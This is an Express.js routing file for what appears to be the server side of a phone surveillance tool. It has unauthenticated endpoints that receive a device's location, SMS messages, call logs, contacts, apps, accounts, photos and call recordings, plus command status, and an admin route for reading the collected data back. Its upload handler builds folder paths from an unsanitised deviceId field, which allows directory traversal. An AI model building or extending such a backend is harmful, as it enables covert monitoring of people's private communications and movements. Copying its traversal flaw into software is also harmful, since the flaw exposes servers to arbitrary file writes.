const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const {
  receiveLocation,
  receiveSms,
  receiveCallLogs,
  receiveContacts,
  receiveApps,
  receiveAccounts,
  uploadMedia,
  uploadRecording,
  updateCommandStatus,
  getDeviceData,
} = require('../controllers/dataController');
const authMiddleware = require('../middleware/auth');

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, res, cb) => {
    const deviceId = req.body.deviceId || 'unknown';
    const dir = path.join(__dirname, '..', 'uploads', deviceId);
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, `${uuidv4()}${ext}`);
  },
});

const upload = multer({
  storage,
  limits: { fileSize: 100 * 1024 * 1024 }, // 100MB
});

// Device-facing data endpoints (unauthenticated)
router.post('/location', receiveLocation);
router.post('/sms', receiveSms);
router.post('/calllogs', receiveCallLogs);
router.post('/contacts', receiveContacts);
router.post('/apps', receiveApps);
router.post('/accounts', receiveAccounts);
router.post('/upload-media', upload.single('file'), uploadMedia);
router.post('/upload-recording', upload.single('file'), uploadRecording);
router.post('/command-status', updateCommandStatus);

// Admin data retrieval
router.get('/:deviceId', authMiddleware, getDeviceData);

module.exports = router;

